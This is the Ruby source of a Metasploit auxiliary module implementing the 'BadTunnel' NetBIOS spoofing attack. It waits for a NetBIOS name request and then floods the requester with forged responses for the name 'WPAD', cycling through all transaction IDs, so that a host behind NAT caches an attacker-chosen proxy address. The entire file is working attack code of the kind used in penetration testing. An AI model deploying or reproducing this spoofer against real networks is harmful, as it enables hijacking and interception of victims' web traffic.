##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'resolv'


class MetasploitModule < Msf::Auxiliary

  def initialize
    super(
      'Name'        => 'NetBIOS "BadTunnel" Service',
      'Description'    => %q{
          This module listens for a NetBIOS name request and then continiously spams
        NetBIOS responses for the name "WPAD" to the requesting host and port. This
        can cause a system behind a NAT gateway to cache a malicious address for the
        "WPAD" hostname.
      },
      'Author'      => ['hdm'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    register_options(
      [
        OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
        OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 137 ]),
        OptAddress.new('WPADHOST',  [ true, "The address that WPAD should resolve to", nil ]),
        OptInt.new('PPSRATE',       [ true, "The rate at which to send NetBIOS replies", 1_000]),
      ], self.class)
  end

  def netbios_service
    @port = datastore['SRVPORT'].to_i

    # MacOS X workaround
    ::Socket.do_not_reverse_lookup = true

    print_status("NetBIOS 'BadTunnel' service is initializing")
    @sock = ::UDPSocket.new()
    @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    @sock.bind(datastore['SRVHOST'], @port)

    @wpad_host = datastore['WPADHOST']
    @targ_rate = datastore['PPSRATE'].to_i

    print_status("BadTunnel: Listening for NetBIOS requests...")

    begin
      loop do
        packet, addr = @sock.recvfrom(65535)
        next if packet.length == 0

        @targ_addr = addr[3]
        @targ_port = addr[1]
        break
      end

      print_status("BadTunnel:  >> Received a NetBIOS request from #{@targ_addr}:#{@targ_port}")
      @sock.connect(@targ_addr, @targ_port)
      netbios_spam

    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("BadTunnel: Error #{e.class} #{e} #{e.backtrace}")
    ensure
      @sock.close
    end
  end

  def netbios_spam
    payload = ["FFFF85000000000100000000204648464145424545434143414341434143414341434143414341434143414141000020000100FFFFFF000600000FFFFFFFF"].pack("H*")
    payload[58,4] = Rex::Socket.addr_aton(@wpad_host)

    stime = Time.now.to_f
    pcnt = 0
    pps  = 0

    print_status("BadTunnel:  >> Spamming WPAD responses to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")

    live = true
    while live
      0.upto(65535) do |txid|
        begin
          payload[0,2] = [txid].pack("n")
          @sock.write(payload)
          pcnt += 1

          pps = (pcnt / (Time.now.to_f - stime)).to_i
          if pps > @targ_rate
            sleep(0.01)
          end
        rescue Errno::ECONNREFUSED
          print_error("BadTunnel:  >> Error: Target sent us an ICMP port unreachable, port is likely closed")
          live = false
          break
        end
      end
    end

    print_status("BadTunnel:  >> Cleaning up...")
  end

  def run
    loop do
      netbios_service
    end
  end

end
